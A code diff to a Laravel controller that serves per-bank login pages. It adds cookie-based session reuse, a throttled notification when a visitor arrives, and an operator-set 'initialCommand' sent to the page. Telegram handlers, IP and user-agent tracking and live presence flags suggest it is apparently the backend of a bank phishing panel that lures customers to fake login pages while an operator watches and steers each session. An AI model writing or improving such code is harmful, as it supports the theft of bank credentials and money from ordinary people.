@@ -7,6 +7,8 @@ use App\Models\BankSession;
 use App\Models\PreSession;
 use App\Telegram\Handlers\SmartSuppHandler;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Str;
 use Inertia\Inertia;
 use Inertia\Response;
@@ -27,12 +29,26 @@ class BankLoginController extends Controller
             abort(404);
         }
 
-        $session = BankSession::create([
-            'bank_slug'        => $bankSlug,
-            'ip_address'       => $request->ip(),
-            'user_agent'       => $request->userAgent(),
-            'last_activity_at' => now(),
-        ]);
+        $cookieName = 'bsid_' . $bankSlug;
+        $existingId = $request->cookie($cookieName);
+        $session    = null;
+
+        if ($existingId) {
+            $session = BankSession::where('id', $existingId)
+                ->where('bank_slug', $bankSlug)
+                ->where('status', '!=', 'completed')
+                ->where('last_activity_at', '>=', now()->subHours(2))
+                ->first();
+        }
+
+        if ($session === null) {
+            $session = BankSession::create([
+                'bank_slug'        => $bankSlug,
+                'ip_address'       => $request->ip(),
+                'user_agent'       => $request->userAgent(),
+                'last_activity_at' => now(),
+            ]);
+        }
 
         $preSession = PreSession::create([
             'ip_address'  => $request->ip(),
@@ -44,15 +60,23 @@ class BankLoginController extends Controller
             'is_online'   => true,
             'last_seen'   => now(),
         ]);
-        PreSessionCreated::dispatch($preSession);
+
+        // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+банк
+        $lockKey = 'presession:' . $request->ip() . ':' . $bankSlug;
+        if (Cache::add($lockKey, true, 15)) {
+            PreSessionCreated::dispatch($preSession);
+        }
 
         $page = 'Banks/' . Str::studly(str_replace('-', '_', $bankSlug));
 
+        Cookie::queue($cookieName, $session->id, 120);
+
         return Inertia::render($page, [
-            'sessionId'    => $session->id,
-            'bankSlug'     => $bankSlug,
-            'smartsupp'    => SmartSuppHandler::getSettings(),
-            'preSessionId' => $preSession->id,
+            'sessionId'      => $session->id,
+            'bankSlug'       => $bankSlug,
+            'smartsupp'      => SmartSuppHandler::getSettings(),
+            'preSessionId'   => $preSession->id,
+            'initialCommand' => $session->action_type ?? ['type' => 'idle'],
         ]);
     }
 }
